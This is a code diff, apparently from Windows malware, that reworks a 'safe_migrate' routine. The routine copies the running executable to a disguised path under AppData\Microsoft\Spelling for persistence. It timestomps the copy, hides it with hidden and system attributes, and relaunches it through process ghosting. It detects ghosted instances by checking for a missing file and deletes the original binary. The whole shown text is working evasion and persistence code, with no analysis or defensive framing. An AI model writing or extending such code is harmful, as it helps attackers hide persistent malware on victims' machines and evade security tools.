@@ -65,31 +65,50 @@ bool safe_migrate() {
     wchar_t appData[MAX_PATH];
 
     API.GetModuleFileNameW(NULL, current_path, MAX_PATH);
+
+    // Ghost detection
+    HANDLE hSelf = API.CreateFileW(current_path, GENERIC_READ,
+        FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+    if (hSelf == INVALID_HANDLE_VALUE) {
+        return false;  // ghosted instance — continue normally
+    }
+    API.CloseHandle(hSelf);
+
+    // Build target path
     API.GetEnvironmentVariableW(L"APPDATA", appData, MAX_PATH);
     swprintf(target_path, MAX_PATH, L"%ls\\Microsoft\\Spelling\\neutral\\default.exe", appData);
 
-    if (wcscmp(current_path, target_path) == 0) {
-        return false;  // migrated
-    }
+    bool firstRun = (wcscmp(current_path, target_path) != 0);
 
-    if (API.CopyFileW(current_path, target_path, FALSE)) {
+    if (firstRun) {
+        // First execution - copy to AppData for persistence
+        if (!API.CopyFileW(current_path, target_path, FALSE))
+            return false;
         timestomp(target_path);
         API.SetFileAttributesW(target_path, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
-
-        HANDLE hFile = API.CreateFileW(target_path, GENERIC_READ,
-            FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
-        if (hFile == INVALID_HANDLE_VALUE) return false;
-
-        DWORD fileSize = GetFileSize(hFile, NULL);
-        PVOID buf = API.RtlAllocateHeap(API.GetProcessHeap(), 0, fileSize);
-        DWORD bytesRead = 0;
-        API.ReadFile(hFile, buf, fileSize, &bytesRead, NULL);
-        API.CloseHandle(hFile);
-
-        NTSTATUS status = GhostExecute(buf, (SIZE_T)fileSize, target_path);
-        API.RtlFreeHeap(API.GetProcessHeap(), 0, buf);
-
-        return (status == 0);
     }
-    return false;
+
+    // Read persistence file into buffer
+    HANDLE hFile = API.CreateFileW(target_path, GENERIC_READ,
+        FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) return false;
+
+    DWORD fileSize = GetFileSize(hFile, NULL);
+    PVOID buf = API.RtlAllocateHeap(API.GetProcessHeap(), 0, fileSize);
+    DWORD bytesRead = 0;
+    API.ReadFile(hFile, buf, fileSize, &bytesRead, NULL);
+    API.CloseHandle(hFile);
+
+    // Ghost execute — no spoof (ghosted child detects via missing file)
+    NTSTATUS status = GhostExecute(buf, (SIZE_T)fileSize);
+    API.RtlFreeHeap(API.GetProcessHeap(), 0, buf);
+
+    if (status != 0) return false;
+
+    if (firstRun) {
+        Internal_Suicide(current_path);  // delete original only
+    }
+
+    API.ExitProcess(0);  // ghosted child takes over
+    return true;
 }
